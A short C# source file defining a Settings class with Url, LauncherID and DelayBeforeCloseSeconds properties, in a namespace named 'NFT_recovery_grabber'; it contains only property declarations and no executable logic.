using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace NFT_recovery_grabber
{
    public sealed class Settings
    {
        public string Url { get; set; }
        public string LauncherID { get; set; }
        public string DelayBeforeCloseSeconds { get; set; }
    }
}
